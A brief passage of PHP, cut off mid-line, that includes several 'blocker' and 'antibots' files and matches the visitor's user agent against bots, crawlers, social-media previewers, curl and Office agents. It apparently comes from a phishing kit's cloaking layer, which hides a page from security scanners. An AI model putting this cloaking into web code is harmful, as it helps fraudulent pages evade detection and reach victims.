...
include 'security/blocker_3.php';
include 'security/blocker_4.php';
include 'prevents/antibots4.php';
include 'prevents/blocker.php';

if(preg_match('/bot|crawler|spider|facebook|alexa|twitter|curl|office|microsft/i', $_SERVER['HTTP_USER_AGENT'])) {
